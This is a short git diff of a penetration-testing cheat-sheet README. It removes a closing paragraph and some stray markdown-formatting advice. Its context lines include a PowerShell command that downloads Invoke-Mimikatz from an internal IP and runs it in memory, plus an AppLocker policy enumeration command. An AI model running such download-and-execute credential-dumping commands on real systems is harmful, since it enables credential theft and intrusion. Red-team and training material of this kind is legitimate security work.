@@ -165,16 +165,3 @@ iex (iwr http://172.16.100.157/Invoke-Mimikatz.ps1 -UseBasicParsing)
   ```powershell
   Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
   ```
-
-## Conclusion
-
-This repository provides essential commands and scripts for penetration testing and domain administration. Always ensure you have proper authorization before using these techniques in any environment.
-```
-
-### Key Elements:
-1. **Headers:** Use headers (`#`, `##`, `###`) to structure the content.
-2. **Code Blocks:** Wrap command examples in triple backticks (```) to make them stand out.
-3. **Bullet Points:** Use bullets (`-`) to list steps or options.
-4. **Inline Code:** Use single backticks (`` ` ``) for inline code snippets.
-
-This format will make the document easy to read, navigate, and share on GitHub.
